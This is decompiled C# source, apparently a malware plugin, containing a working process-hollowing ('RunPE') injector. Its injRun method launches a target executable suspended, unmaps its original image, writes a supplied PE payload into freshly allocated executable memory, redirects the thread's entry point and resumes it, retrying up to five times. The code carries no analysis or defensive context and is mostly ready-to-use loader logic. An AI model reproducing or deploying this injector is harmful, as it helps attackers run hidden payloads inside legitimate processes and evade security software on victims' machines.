using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;

namespace Plugin
{
	// Token: 0x02000008 RID: 8
	public class Plugin
	{
		// Token: 0x06000010 RID: 16
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "CreateProcess")]
		private static extern bool CreateProcess_APIOO(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Plugin.STARTUP_INFORMATION startupInfo, ref Plugin.PROCESS_INFORMATION processInformation);

		// Token: 0x06000011 RID: 17
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", EntryPoint = "GetThreadContext")]
		private static extern bool GetThreadContext_API(IntPtr thread, int[] context);

		// Token: 0x06000012 RID: 18
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext")]
		private static extern bool Wow64GetThreadContext_API(IntPtr thread, int[] context);

		// Token: 0x06000013 RID: 19
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", EntryPoint = "SetThreadContext")]
		private static extern bool SetThreadContext_API(IntPtr thread, int[] context);

		// Token: 0x06000014 RID: 20
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext")]
		private static extern bool Wow64SetThreadContext_API(IntPtr thread, int[] context);

		// Token: 0x06000015 RID: 21
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
		private static extern bool ReadProcessMemory_API(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

		// Token: 0x06000016 RID: 22
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
		private static extern bool WriteProcessMemory_API(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

		// Token: 0x06000017 RID: 23
		[SuppressUnmanagedCodeSecurity]
		[DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection")]
		private static extern int NtUnmapViewOfSection_API(IntPtr process, int baseAddress);

		// Token: 0x06000018 RID: 24
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx")]
		private static extern int VirtualAllocEx_API(IntPtr handle, int address, int length, int type, int protect);

		// Token: 0x06000019 RID: 25
		[SuppressUnmanagedCodeSecurity]
		[DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
		private static extern int ResumeThread_API(IntPtr handle);

		// Token: 0x0600001A RID: 26 RVA: 0x000021BC File Offset: 0x000003BC
		public static bool injRun(string path, byte[] data)
		{
			int num = 1;
			checked
			{
				for (;;)
				{
					bool flag = Plugin.HandleRun(path, data);
					if (flag)
					{
						break;
					}
					num++;
					if (num > 5)
					{
						goto Block_2;
					}
				}
				return true;
				Block_2:
				return false;
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000021E8 File Offset: 0x000003E8
		private static bool HandleRun(string path, byte[] data)
		{
			string text = string.Format("\"{0}\"", path);
			Plugin.STARTUP_INFORMATION startup_INFORMATION = default(Plugin.STARTUP_INFORMATION);
			Plugin.PROCESS_INFORMATION process_INFORMATION = default(Plugin.PROCESS_INFORMATION);
			startup_INFORMATION.dwFlags = 0;
			checked
			{
				startup_INFORMATION.Size_ = (uint)Marshal.SizeOf(typeof(Plugin.STARTUP_INFORMATION));
				try
				{
					bool flag = !string.IsNullOrEmpty("");
					if (flag)
					{
						text = ((text + " ") ?? "");
					}
					bool flag2 = !Plugin.CreateProcess_APIOO(path, text, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, null, ref startup_INFORMATION, ref process_INFORMATION);
					if (flag2)
					{
						throw new Exception();
					}
					int num = BitConverter.ToInt32(data, 60);
					int num2 = BitConverter.ToInt32(data, num + 52);
					int[] array = new int[179];
					array[0] = 65538;
					bool flag3 = IntPtr.Size == 4;
					if (flag3)
					{
						bool flag4 = !Plugin.GetThreadContext_API(process_INFORMATION.ThreadHandle, array);
						if (flag4)
						{
							throw new Exception();
						}
					}
					else
					{
						bool flag5 = !Plugin.Wow64GetThreadContext_API(process_INFORMATION.ThreadHandle, array);
						if (flag5)
						{
							throw new Exception();
						}
					}
					int num3 = array[41];
					int num4;
					int num5;
					bool flag6 = !Plugin.ReadProcessMemory_API(process_INFORMATION.ProcessHandle, num3 + 8, ref num4, 4, ref num5);
					if (flag6)
					{
						throw new Exception();
					}
					bool flag7 = num2 == num4;
					if (flag7)
					{
						bool flag8 = Plugin.NtUnmapViewOfSection_API(process_INFORMATION.ProcessHandle, num4) != 0;
						if (flag8)
						{
							throw new Exception();
						}
					}
					int length = BitConverter.ToInt32(data, num + 80);
					int bufferSize = BitConverter.ToInt32(data, num + 84);
					int num6 = Plugin.VirtualAllocEx_API(process_INFORMATION.ProcessHandle, num2, length, 12288, 64);
					bool flag9 = num6 == 0;
					if (flag9)
					{
						throw new Exception();
					}
					bool flag10 = !Plugin.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, num6, data, bufferSize, ref num5);
					if (flag10)
					{
						throw new Exception();
					}
					int num7 = num + 248;
					short num8 = BitConverter.ToInt16(data, num + 6);
					int num9 = (int)(num8 - 1);
					for (int i = 0; i <= num9; i++)
					{
						int num10 = BitConverter.ToInt32(data, num7 + 12);
						int num11 = BitConverter.ToInt32(data, num7 + 16);
						int sourceIndex = BitConverter.ToInt32(data, num7 + 20);
						bool flag11 = num11 != 0;
						if (flag11)
						{
							byte[] array2 = new byte[num11 - 1 + 1];
							Array.Copy(data, sourceIndex, array2, 0, array2.Length);
							bool flag12 = !Plugin.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, num6 + num10, array2, array2.Length, ref num5);
							if (flag12)
							{
								throw new Exception();
							}
						}
						num7 += 40;
					}
					byte[] bytes = BitConverter.GetBytes(num6);
					bool flag13 = !Plugin.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, num3 + 8, bytes, 4, ref num5);
					if (flag13)
					{
						throw new Exception();
					}
					int num12 = BitConverter.ToInt32(data, num + 40);
					bool flag15;
					bool flag14 = flag15;
					if (flag14)
					{
						num6 = num2;
					}
					array[44] = num6 + num12;
					bool flag16 = IntPtr.Size == 4;
					if (flag16)
					{
						bool flag17 = !Plugin.SetThreadContext_API(process_INFORMATION.ThreadHandle, array);
						if (flag17)
						{
							throw new Exception();
						}
					}
					else
					{
						bool flag18 = !Plugin.Wow64SetThreadContext_API(process_INFORMATION.ThreadHandle, array);
						if (flag18)
						{
							throw new Exception();
						}
					}
					bool flag19 = Plugin.ResumeThread_API(process_INFORMATION.ThreadHandle) == -1;
					if (flag19)
					{
						throw new Exception();
					}
				}
				catch (Exception ex)
				{
					Process processById = Process.GetProcessById((int)process_INFORMATION.ProcessId);
					bool flag20 = processById != null;
					if (flag20)
					{
						processById.Kill();
					}
					return false;
				}
				return true;
			}
		}

		// Token: 0x0200000B RID: 11
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		private struct PROCESS_INFORMATION
		{
			// Token: 0x04000009 RID: 9
			public IntPtr ProcessHandle;

			// Token: 0x0400000A RID: 10
			public IntPtr ThreadHandle;

			// Token: 0x0400000B RID: 11
			public uint ProcessId;

			// Token: 0x0400000C RID: 12
			public uint ThreadId;
		}

		// Token: 0x0200000C RID: 12
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		private struct STARTUP_INFORMATION
		{
			// Token: 0x0400000D RID: 13
			public uint Size_;

			// Token: 0x0400000E RID: 14
			public string Reserved1;

			// Token: 0x0400000F RID: 15
			public string Desktop;

			// Token: 0x04000010 RID: 16
			public string Title;

			// Token: 0x04000011 RID: 17
			public int dwX;

			// Token: 0x04000012 RID: 18
			public int dwY;

			// Token: 0x04000013 RID: 19
			public int dwXSize;

			// Token: 0x04000014 RID: 20
			public int dwYSize;

			// Token: 0x04000015 RID: 21
			public int dwXCountChars;

			// Token: 0x04000016 RID: 22
			public int dwYCountChars;

			// Token: 0x04000017 RID: 23
			public int dwFillAttribute;

			// Token: 0x04000018 RID: 24
			public int dwFlags;

			// Token: 0x04000019 RID: 25
			public short wShowWindow;

			// Token: 0x0400001A RID: 26
			public short cbReserved2;

			// Token: 0x0400001B RID: 27
			public IntPtr Reserved2;

			// Token: 0x0400001C RID: 28
			public IntPtr StdInput;

			// Token: 0x0400001D RID: 29
			public IntPtr StdOutput;

			// Token: 0x0400001E RID: 30
			public IntPtr StdError;
		}
	}
}
